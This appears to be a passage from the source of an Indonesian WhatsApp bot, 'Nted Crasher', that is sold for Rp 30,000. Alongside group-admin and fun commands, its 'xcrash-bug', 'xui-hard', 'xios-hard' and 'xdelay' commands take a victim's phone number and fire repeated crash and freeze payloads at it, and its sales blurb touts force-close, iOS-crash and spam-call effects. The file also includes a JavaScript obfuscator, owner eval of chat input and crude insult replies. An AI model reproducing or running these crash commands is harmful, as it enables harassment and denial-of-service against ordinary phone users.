┃𝙾𝚠𝚗  : *${isOwner ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝙿𝚛𝚎𝚖 : *${isPrem ? "𝑌𝑎" : "𝑇𝑖𝑑𝑎𝑘"}*
┃𝚃𝚢𝚙𝚎 : 𝘝𝘪𝘱 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
┃𝙲𝚛𝚎𝚍𝚒𝚝 : 𝑵𝒕𝒆𝒅𝑪𝒓𝒂𝒔𝒉𝒆𝒓
┃𝙷𝚊𝚛𝚒 : *${new Date().toLocaleString()}*
╰╼━━━━━━━━━━━━━

╭╼━( 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 )
┃antilink
┃antilink2
┃welcome
┃promote
┃demote
┃opengc
┃closegc
┃add
┃kick
┃tagall
┃ht
╰╼━━━━━━━━━━━━━

╭╼━( 𝑭𝒖𝒏 𝑴𝒆𝒏𝒖 )
┃spamtag
┃tourl
┃tiktok
┃instagram
┃play
┃cekganteng
┃cekcantik
┃cekkontol
┃hd
┃enc-hard
┃brat
┃bratvid
┃islam
┃kata
┃motivasi
╰╼━━━━━━━━━━━━━
`
nted.sendMessage(m.chat, {
    video: {
        url: 'https://files.catbox.moe/fyuz7x.mp4'
    },
    caption: menu,
    gifPlayback: true,
    gifAttribution: 1,
    contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
            showAdAttribution: false,
            title: '𝑵𝒕𝒆𝒅 𝑪𝒓𝒂𝒔𝒉𝒆𝒓',
            body: '© 𝐍𝐭𝐞𝐝 𝐁𝐞𝐬𝐭 𝐒𝐜𝐫𝐢𝐩𝐭',
            thumbnailUrl: RandomShort,
            sourceUrl: 'https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l',
            mediaType: 1,
            renderLargerThumbnail: false
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363393940866504@newsletter',
            newsletterName: '𝐍𝐭𝐞𝐝 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥',
            serverMessageId: -1
         }
         },
         headerType: 6,
         viewOnce: true
}, { quoted: lol });
    await nted.sendMessage(m.chat, { audio: fs.readFileSync('./sound/nted.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: Olla });
}
break;
//================= FUNNN ================//
case 'bot': {
ReplyGwe(`*Gw Udah On Sejak*\n*${runtime(process.uptime())}*`)
}
break
case 'nted': {
ReplyGwe(`Ngapain Nyariin Owner Gw?\nSuka Ya 🤭`)
}
break
case 'babi':
case 'kntol':
case 'pler':
case 'mmq':
case 'kontol':
case 'nted': {
ReplyGwe(`Muka Lu Tu Kayak *${command}*, Sok Bilang² Hadehhhh\n> Bot Nted`)
}
break

case "tt":
case "tiktok": {
await fitur.tiktok(nted, m, text, ReplyGwe, lol)
}
break
case "instagram":
case "igdl":
case "ig": {
await fitur.instagram(nted, m, text, ReplyGwe)
}
break
case "play": {
await fitur.play(nted, m, text, ReplyGwe, ftoko)
}
break
case "cekganteng":
case "cekcantik": {
await fitur.cekganteng(nted, m, text, ReplyGwe, lol, ftoko, command)
}
break
case "cekkontol": {
await fitur.cekkontol(nted, m, text, ReplyGwe, lol)
}
break
case "hd":
case "remini":
case "buathd": {
await fitur.remini(nted, m, text, ReplyGwe, prefix, command, ftoko)
}
break
case 'enc-hard': {
    if (!m.quoted) return m.reply("*❌ SALAH*\nreply filenya .js");
    if (mime !== "application/javascript") return m.reply("lol Reply File Js Nya Bujang");

    let a = await m.quoted.download();
    let b = m.quoted.fileName;
    const filePath = `./@hardenc${b}.js`;

    if (a.length > 400 * 1024) return m.reply("File terlalu besar. Maksimal 400KB.");

    fs.writeFileSync(filePath, a);
    await m.reply("*🚀 PROSES*\nProses Encrypted File Lu Anjg");

    try {
        const sourceCode = fs.readFileSync(filePath, "utf-8");
        const obfuscated = await JsConfuser.obfuscate(sourceCode, {
            target: "node",
            preset: "medium",
            compact: true,
            minify: true,
            flatten: false,
            identifierGenerator: function () {
                const c = "難NtedIsOwner素" + "難NtedCrasher素";
                const d = x => x.replace(/[^a-zA-Z座Nted素Crasher素]/g, '');
                const e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
                return d(c) + e(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0,
            stringConcealing: false, // dimatikan untuk ringan
            stringCompression: false, // dimatikan
            controlFlowFlattening: false, // matikan untuk ringan
            deadCode: false,
            hexadecimalNumbers: true,
            objectExtraction: false,
            globalConcealing: false,
        });

        fs.writeFileSync(filePath, obfuscated);
        await nted.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(filePath),
                mimetype: "application/javascript",
                fileName: b,
                caption: "*✅ SUKSES*\nFile Sukses Di Ewe Mas"
            },
            { quoted: m }
        );
    } catch (err) {
        m.reply("Gagal Encrypt: " + err.message);
    }
}
break;
case "brat": {
    if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix + command} halo suki`);
    try {
        await nted.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
        const response = await axios.get(url, { responseType: "arraybuffer" });

        const sticker = new Sticker(response.data, {
            pack: "Stiker By",
            author: "Nted | Beginner",
            type: "image/png"
        });

        const stikerBuffer = await sticker.toBuffer();
        await nted.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: lol });

    } catch (err) {
        console.error("Error:", err);
        await nted.sendMessage(m.chat, {
            text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
        }, { quoted: lol });
    }
}
break;
case "bratvid": {
    if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix + command} halo suki`);
    try {
        await nted.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
        const response = await axios.get(url, { responseType: "arraybuffer" });

        const sticker = new Sticker(response.data, {
            pack: "Stiker By",
            author: "Nted | Beginner",
            type: "image/png"
        });

        const stikerBuffer = await sticker.toBuffer();
        await nted.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: ftoko });

    } catch (err) {
        console.error("Error:", err);
        await nted.sendMessage(m.chat, {
            text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat video. Coba lagi nanti.",
        }, { quoted: ftoko });
    }
}
break;
//================= GROUP ================//
case 'ht':
case 'hidetag': {
  if (!isPrem && !isOwner && !isBot) return ReplyGwe("❌ Lu siapa? Prem/Owner/Bot aja yang bisa.");
  if (!text && !m.quoted) return ReplyGwe("❌ Tulis teks atau reply teks yang mau di-hidetag.");

  let teks = m.quoted ? m.quoted.text : text;
  let member = (await nted.groupMetadata(m.chat)).participants.map(e => e.id);
  await nted.sendMessage(m.chat, { text: teks, mentions: member });
}
break;
case "tagall": {
  if (!m.isGroup) return ReplyGwe(mess.group);
  if (!isOwner && !m.isAdmins) return ReplyGwe(mess.admin);
  if (!text) return ReplyGwe("❌ Tulis pesan yang mau dibagikan.");

  let metadata = await nted.groupMetadata(m.chat);
  let member = metadata.participants
    .map(v => v.id)
    .filter(e => e !== botNumber && e !== m.sender);

  let teks = text + "\n\n" + member.map(e => `@${e.split("@")[0]}`).join("\n");
  await nted.sendMessage(m.chat, { text: teks, mentions: member }, { quoted: m });
}
break;
case 'add':
case 'addmember': {
  if (!m.isGroup) return ReplyGwe("❌ Fitur hanya untuk grup.");
  if (!isAdmins && !isOwner) return ReplyGwe("❌ Lu bukan admin.");
  if (!isBotAdmins) return ReplyGwe("❌ Bot harus jadi admin.");
  if (!text) return ReplyGwe(`Kirim nomornya!\nContoh: ${prefix + command} 6281234567890`);

  let number = text.replace(/[^0-9]/g, "");
  if (number.length < 8) return ReplyGwe("❌ Nomor tidak valid.");

  let jid = number + "@s.whatsapp.net";
  try {
    let res = await nted.groupParticipantsUpdate(m.chat, [jid], "add");
    let status = res[0]?.status;
    if (status === 403) return ReplyGwe("Gagal: privasi undangan ketat.");
    if (status === 408) return ReplyGwe("Gagal: nomor tidak ditemukan.");
    if ([200, 409].includes(status)) return ReplyGwe("✅ Sukses menambahkan member.");
    return ReplyGwe("❌ Gagal, status: " + status);
  } catch (e) {
    console.error("ADD ERROR:", e);
    ReplyGwe("❌ Terjadi kesalahan menambahkan member.");
  }
}
break;
case "closegc":
case "close":
case "opengc":
case "open": {
  if (!m.isGroup) return ReplyGwe(mess.group);
  if (!isOwner && !isAdmins) return ReplyGwe(mess.admin);
  if (!isBotAdmins) return ReplyGwe("❌ Bot harus jadi admin.");

  try {
    let metadata = await nted.groupMetadata(m.chat);
    if (/open|opengc/.test(command)) {
      if (!metadata.announce) return ReplyGwe("❌ Grup sudah terbuka.");
      await nted.groupSettingUpdate(m.chat, 'not_announcement');
      ReplyGwe("✅ Grup berhasil dibuka.");
    } else {
      if (metadata.announce) return ReplyGwe("❌ Grup sudah tertutup.");
      await nted.groupSettingUpdate(m.chat, 'announcement');
      ReplyGwe("✅ Grup berhasil ditutup.");
    }
  } catch (err) {
    console.error("❌ Error open/close group:", err);
    ReplyGwe("❌ Gagal mengubah pengaturan grup.");
  }
}
break;
case 'kick': {
  if (!m.isGroup) return ReplyGwe('❌ Fitur khusus grup.');
  if (!isAdmins && !isOwner) return ReplyGwe('❌ Lu bukan admin.');
  if (!isBotAdmins) return ReplyGwe("❌ Bot harus jadi admin.");

  const target = m.mentionedJid?.[0] || m.quoted?.sender;
  if (!target) return ReplyGwe('❌ Tag atau reply target.');
  if (target === nted.user?.id) return ReplyGwe("😹 Gabisa kick bot sendiri.");
  if (target === m.sender) return ReplyGwe("😹 Ngapain kick diri sendiri.");

  let metadata = await nted.groupMetadata(m.chat);
  let groupAdmins = metadata.participants
    .filter(v => v.admin)
    .map(v => v.id);
  if (groupAdmins.includes(target)) return ReplyGwe("😹 Gabisa kick admin.");

  try {
    await nted.groupParticipantsUpdate(m.chat, [target], 'remove');
    await nted.sendMessage(m.chat, {
      text: `✅ Berhasil kick @${target.split("@")[0]}`,
      mentions: [target]
    }, { quoted: m });
  } catch (e) {
    console.error('❌ Error saat kick:', e);
    ReplyGwe('❌ Gagal kick. Mungkin karena sistem error.');
  }
}
break;
case "promote":
case "demote": {
  if (!m.isGroup) return ReplyGwe(mess.group);
  if (!isOwner && !isAdmins) return ReplyGwe("❌ Lu bukan admin.");
  if (!isBotAdmins) return ReplyGwe("❌ Bot harus jadi admin.");

  let target = m.mentionedJid?.[0] || m.quoted?.sender;
  if (!target) return ReplyGwe("❌ Tag atau reply user yang mau dipromote/demote.");

  try {
    let action = /promote/.test(command) ? "promote" : "demote";
    await nted.groupParticipantsUpdate(m.chat, [target], action);
    await nted.sendMessage(m.chat, {
      text: `✅ Berhasil ${action} @${target.split("@")[0]}`,
      mentions: [target]
    }, { quoted: m });
  } catch (e) {
    console.error("Promote/Demote error:", e);
    ReplyGwe("❌ Gagal memproses perintah.");
  }
}
break;
case 'autoview':
  if (!isOwner) return ReplyGwe('Hanya owner yang bisa mengatur ini.');
  if (!args[0]) return ReplyGwe(`Contoh:\n.autoview on\n.autoview off`);

  if (args[0].toLowerCase() === 'on') {
    global.autoviewsw = true;
    ReplyGwe('✅ Auto React Status diaktifkan!');
  } else if (args[0].toLowerCase() === 'off') {
    global.autoviewsw = false;
    ReplyGwe('✅ Auto React Status dimatikan!');
  } else {
    ReplyGwe('❌ Pilihannya hanya: on atau off');
  }
  break;
case "antilink2": {
    if (!m.isGroup) return ReplyGwe(mess.group);
    if (!isOwner) return ReplyGwe(mess.owner);
    if (!text) return ReplyGwe("❌ Format salah!\nContoh: antilink on/off");

    initGroupData(m.chat);

    let teks = text.toLowerCase();
    if (teks === "on") {
        if (global.db.groups[m.chat].antilink) return ReplyGwe(`*Antilink* sudah aktif di grup ini!`);
        global.db.groups[m.chat].antilink = true;
        global.db.groups[m.chat].antilink2 = false; // matikan mode lain
        return ReplyGwe("✅ *Antilink* berhasil diaktifkan di grup ini");
    } 
    else if (teks === "off") {
        if (!global.db.groups[m.chat].antilink) return ReplyGwe(`*Antilink* tidak aktif di grup ini!`);
        global.db.groups[m.chat].antilink = false;
        return ReplyGwe("🚫 *Antilink* berhasil dimatikan di grup ini");
    } 
    else return ReplyGwe("❌ Pilih: on / off");
}
break;
// ===== ANTI LINK DELETE =====
case "antilink": {
    if (!m.isGroup) return ReplyGwe(mess.group);
    if (!isOwner) return ReplyGwe(mess.owner);
    if (!text) return ReplyGwe("❌ Format salah!\nContoh: antilink2 on/off");

    initGroupData(m.chat);

    let teks = text.toLowerCase();
    if (teks === "on") {
        if (global.db.groups[m.chat].antilink2) return ReplyGwe(`*Antilink2* sudah aktif di grup ini!`);
        global.db.groups[m.chat].antilink2 = true;
        global.db.groups[m.chat].antilink = false; // matikan mode lain
        return ReplyGwe("✅ *Antilink2* berhasil diaktifkan di grup ini");
    } 
    else if (teks === "off") {
        if (!global.db.groups[m.chat].antilink2) return ReplyGwe(`*Antilink2* tidak aktif di grup ini!`);
        global.db.groups[m.chat].antilink2 = false;
        return ReplyGwe("🚫 *Antilink2* berhasil dimatikan di grup ini");
    } 
    else return ReplyGwe("❌ Pilih: on / off");
}
break;
case "welcome": {
    if (!m.isGroup) return ReplyGwe(mess.group);
    if (!isOwner) return ReplyGwe(mess.owner);
    if (!text) return ReplyGwe("❌ Format salah!\nContoh: welcome on/off");

    initGroupData(m.chat);

    let teks = text.toLowerCase();
    if (teks === "on") {
        if (global.db.groups[m.chat].welcome) return ReplyGwe(`✅ Welcome sudah aktif di grup ini!`);
        global.db.groups[m.chat].welcome = true;
        return ReplyGwe("✅ Welcome berhasil diaktifkan di grup ini");
    } 
    else if (teks === "off") {
        if (!global.db.groups[m.chat].welcome) return ReplyGwe(`❌ Welcome tidak aktif di grup ini!`);
        global.db.groups[m.chat].welcome = false;
        return ReplyGwe("🚫 Welcome berhasil dimatikan di grup ini");
    } 
    else return ReplyGwe("❌ Pilih: on / off");
}
break;
//================= GROUP ================//
case 'islam': {
  let teks = quotesIslami[Math.floor(Math.random() * quotesIslami.length)];

  await nted.sendMessage(m.chat, {
    text: `*Quotes Islami Hari Ini, Buat Kak ${m.pushName} Semoga Cepet Tobat Ya*\n\n_"${teks.text}"_\n\nDari Kak *${teks.author}*`
  }, { quoted: ftoko });

  await nted.sendMessage(m.chat, {
    audio: fs.readFileSync('./sound/katanted.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: ftoko });
}
break;
case 'kata': {
  let teks = Katakatahariini[Math.floor(Math.random() * Katakatahariini.length)];

  await nted.sendMessage(m.chat, {
    text: `*Kata² Hari Ini, Buat Kak, Keep Strong Ya Kak ${m.pushName}*\n\n_"${teks.text}"_\n\nDari Kak *${teks.author}*`
  }, { quoted: lol });

  await nted.sendMessage(m.chat, {
    audio: fs.readFileSync('./sound/katanted.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: ftoko });
}
break;
case 'motivasi': {
  let teks = motivasidek[Math.floor(Math.random() * motivasidek.length)];

  await nted.sendMessage(m.chat, {
    text: `*Motivasi Hari Ini, Buat Kak ${m.pushName} Semoga Kuat Terus*\n\n_"${teks.text}"_\n\nDari Kak *${teks.author}*`
  }, { quoted: lol });

  await nted.sendMessage(m.chat, {
    audio: fs.readFileSync('./sound/katanted.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: ftoko });
}
break;
case 'aited':
case 'ai': {
    if (!text) return ReplyGwe('Masukkan pertanyaan! Contoh: .ai siapa presiden?');
    
    try {
        let res = await fetch(`https://api.chatgpt.com/ask?q=${encodeURIComponent(q)}`);
        let json = await res.json();
        ReplyGwe(json.result || "Maaf, saya tidak bisa menjawab, karna api nya eror, nted malas fix katanya");
    } catch (e) {
        ReplyGwe("Terjadi kesalahan saat menghubungi AI.");
    }
    break;
}
case 'sticker':
case 's': {
    if (!m.quoted) return ReplyGwe(`Balas gambar atau video dengan caption .s`);

    try {
        let media = await downloadMediaMessage(m.quoted);
        await nted.sendMessage(m.chat, { sticker: media }, { quoted: lol });
    } catch (e) {
        ReplyGwe("Gagal mengubah media menjadi stiker.");
    }
    break;
}
//=========================================//
case 'xcrash-bug': {
if (!isBot && !isOwner && !isPrem) return ReplyGwe('𝙆𝙝𝙪𝙨𝙪𝙨 𝘽𝙖𝙣𝙜 𝗡𝘁𝗲𝗱!!')
if (!text) return ReplyGwe(`*Salah ❌*\nExample : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
ReplyGwe(`
 『 𝑷𝑹𝑶𝑺𝑬𝑺 𝑲𝑰𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}\n 𝚂𝚒𝚊𝚙 𝙱𝚞𝚐 𝙼𝚘𝚑𝚘𝚗 𝙹𝚎𝚍𝚊 𝟻 𝙼𝚎𝚗𝚒𝚝 𝙰𝚐𝚊𝚛 𝙱𝚘𝚝 𝚃𝚒𝚍𝚊𝚔 𝙺𝚎𝚗𝚘𝚗.

© Nted Owner`)
await doneress();
// Memulai Crashing
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
await ForceCloseClick(target);
nted.sendMessage(from, {react: {text: "🥶", key: m.key}})
}
break
case 'xui-hard': {
if (!isBot && !isOwner && !isPrem) return ReplyGwe('𝙆𝙝𝙪𝙨𝙪𝙨 𝘽𝙖𝙣𝙜 𝗡𝘁𝗲𝗱!!')
if (!text) return ReplyGwe(`*Salah ❌*\nExample : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
ReplyGwe(`
 『 𝑷𝑹𝑶𝑺𝑬𝑺 𝑲𝑰𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}\n 𝚂𝚒𝚊𝚙 𝙱𝚞𝚐 𝙼𝚘𝚑𝚘𝚗 𝙹𝚎𝚍𝚊 𝟻 𝙼𝚎𝚗𝚒𝚝 𝙰𝚐𝚊𝚛 𝙱𝚘𝚝 𝚃𝚒𝚍𝚊𝚔 𝙺𝚎𝚗𝚘𝚗.

© Nted Owner`)
await doneress();
// Memulai Crashing
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
await CrashFreezeAndUi(target);
nted.sendMessage(from, {react: {text: "🥶", key: m.key}})
}
break
case 'xios-hard': {
if (!isBot && !isOwner && !isPrem) return ReplyGwe('𝙆𝙝𝙪𝙨𝙪𝙨 𝘽𝙖𝙣𝙜 𝗡𝘁𝗲𝗱!!')
if (!text) return ReplyGwe(`*Salah ❌*\nExample : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
ReplyGwe(`
 『 𝑷𝑹𝑶𝑺𝑬𝑺 𝑲𝑰𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}\n 𝚂𝚒𝚊𝚙 𝙱𝚞𝚐 𝙼𝚘𝚑𝚘𝚗 𝙹𝚎𝚍𝚊 𝟻 𝙼𝚎𝚗𝚒𝚝 𝙰𝚐𝚊𝚛 𝙱𝚘𝚝 𝚃𝚒𝚍𝚊𝚔 𝙺𝚎𝚗𝚘𝚗.

© Nted Owner`)
await doneress();
// Memulai Crashing
await CrashHardIos(target);
await CrashHardIos(target);
await CrashHardIos(target);
await CrashHardIos(target);
await CrashHardIos(target);
await CrashHardIos(target);
await CrashHardIos(target);
await sleep(1000);
nted.sendMessage(from, {react: {text: "🥶", key: m.key}})
}
break
case 'xdelay': {
if (!isBot && !isOwner && !isPrem) return ReplyGwe('𝙆𝙝𝙪𝙨𝙪𝙨 𝘽𝙖𝙣𝙜 𝗡𝘁𝗲𝗱!!')
if (!text) return ReplyGwe(`*Salah ❌*\nExample : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
ReplyGwe(`
 『 𝑷𝑹𝑶𝑺𝑬𝑺 𝑲𝑰𝑳 𝑻𝑨𝑹𝑮𝑬𝑻 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}\n 𝚂𝚒𝚊𝚙 𝙱𝚞𝚐 𝙼𝚘𝚑𝚘𝚗 𝙹𝚎𝚍𝚊 𝟻 𝙼𝚎𝚗𝚒𝚝 𝙰𝚐𝚊𝚛 𝙱𝚘𝚝 𝚃𝚒𝚍𝚊𝚔 𝙺𝚎𝚗𝚘𝚗.

© Nted Owner`)
await doneress();
// Memulai Crashing
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
await DelayMakerNewInvis(target);
nted.sendMessage(from, {react: {text: "🥶", key: m.key}})
}
break
//=========================================//

case "sc":
case "script": {
let menu = `
*\`NTED CRASHER - V14 VIP\`*`
let groupMetadata = await nted.groupMetadata(m.chat).catch(e => null)
let member = groupMetadata.participants.map(u => u.id)
let icon = (await axios.get('https://files.catbox.moe/5737ak.jpg', { responseType: 'arraybuffer' })).data
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: member,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `NTED CRASHER | INFORMATION`,
newsletterJid: "120363371523588977@newsletter",
serverMessageId: 143
},
businessMessageForwardInfo: {
businessOwnerJid: nted.decodeJid(nted.user.id)
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: menu
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `*HARGA :*
 *Script : Rp 30,000*

- - # Keamanan Script
* Encrypt Hard
* Login System
* Anti Bypas Abal²

- - # Efek Bugs
* Force Close New 📈
* Crash Ui New 📈
* Crash Ios Hard 📈
* Delay Mention 📈
* Spam Call 📈
* Spam Call Vidd 📈
* Anti Gimmick Bre
 
- - # Show Fitur Script
* Bugmenu
* JagaGroup
* Fun Menu
`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: icon }, { upload: nted.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram Nted\",\"url\":\"https://t.me/NtedCrasher\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"CHANNEL - NTED\",\"url\":\"https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l\",\"merchant_url\":\"https://whatsapp.com/channel/0029VayaAvsLCoWymzQZrr1l\"}`
}
]
})
})
}
}
}, {})
await nted.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break
//=========================================//
case 'public': {
  if (!isBot && !isOwner) return ReplyGwe('Fitur Ini Khusus Bot Dan Bang Nted');
  nted.public = true;
  ReplyGwe('*`Success: Bot Diubah ke Mode Public 🚀`*');
}
break;
case 'self': {
  if (!isBot && !isOwner) return ReplyGwe('Fitur Ini Khusus Bot Dan Bang Nted');
  if (!isOwner) return ReplyGwe('`Fitur Ini Hanya Bisa Di Pake Bang Teddy`');
  nted.public = false;
  ReplyGwe('*`Success: Bot Diubah ke Mode Private 🥶`*');
}
break;
case 'addown': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur Ini Khusus Bg Nted Dek!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/owner.json'))

  if (data.includes(nomor)) return ReplyGwe('Sudah terdaftar sebagai owner.')
  data.push(nomor)
  fs.writeFileSync('./lib/database/owner.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menambahkan ${nomor} ke owner.`)
  break
}
case 'delown': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur Ini Khusus Bg Nted Dek!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/owner.json'))

  if (!data.includes(nomor)) return ReplyGwe('Nomor tidak ditemukan di daftar owner.')
  data = data.filter(n => n !== nomor)
  fs.writeFileSync('./lib/database/owner.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menghapus ${nomor} dari owner.`)
  break
}
case 'addbug': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur Ini Khusus Bg Nted Dek!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/murbug.json'))

  if (data.includes(nomor)) return ReplyGwe('Sudah terdaftar sebagai owner.')
  data.push(nomor)
  fs.writeFileSync('./lib/database/murbug.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menambahkan ${nomor} ke murbug.`)
  break
}
case 'delbug': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur Ini Khusus Bg Nted Dek!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/murbug.json'))

  if (!data.includes(nomor)) return ReplyGwe('Nomor tidak ditemukan di daftar owner.')
  data = data.filter(n => n !== nomor)
  fs.writeFileSync('./lib/database/murbug.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menghapus ${nomor} dari murbug.`)
  break
}
case 'listown': {
  let data = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
  let teks = `Daftar Owner Gwe :\n\n` + data.map((n, i) => `${i + 1}. wa.me/${n.split('@')[0]}`).join('\n')
  ReplyGwe(teks)
  break
}
case 'addprem': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur ini hanya untuk owner utama!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/premium.json'))

  if (data.includes(nomor)) return ReplyGwe('Sudah terdaftar sebagai user premium.')
  data.push(nomor)
  fs.writeFileSync('./lib/database/premium.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menambahkan ${nomor} ke premium.`)
  break
}
case 'delprem': {
  if (!isOwner && !isBot) return ReplyGwe('Fitur ini hanya untuk owner utama!')
  if (!text) return ReplyGwe(`Contoh: ${prefix + command} 628xxx`)
  let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let data = JSON.parse(fs.readFileSync('./lib/database/premium.json'))

  if (!data.includes(nomor)) return ReplyGwe('Nomor tidak ditemukan di daftar premium.')
  data = data.filter(n => n !== nomor)
  fs.writeFileSync('./lib/database/premium.json', JSON.stringify(data, null, 2))
  ReplyGwe(`Berhasil menghapus ${nomor} dari premium.`)
  break
}
//=========================================//

default:
if (budy.startsWith('>')) {
if (!isOwner) return ReplyGwe("Lu Siapa Kontol, Fitur Owner Lu Mainin")
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await ReplyGwe(evaled);
} catch (err) {
ReplyGwe(String(err));
}
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (budy.startsWith('<')) {
if (!isOwner) return ReplyGwe("Lu Siapa Kids?\nMIKIR KIDS");
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
/* 
   BASE CREATE BY NTED CRASHER
  - EROR? FIX SENDIRI GAUSA BNYK TANYA
  - FREE RENAME/RECODE
  - FREE SHARE/DLL
  - JANGAN JUAL ANJG
  
  Support By : Allah Swt
               Ortu Gw
               Teddy ( Gw )
               Yuukey ( Friend )
               Faxz ( Friend )
               Rexz ( Friend )
               DaffaDev ( Sensei )
               Dapz ( Sensei )
               Ikky ( Pt Terpenting Gw )
               All Seller Gw ( Best Support )               
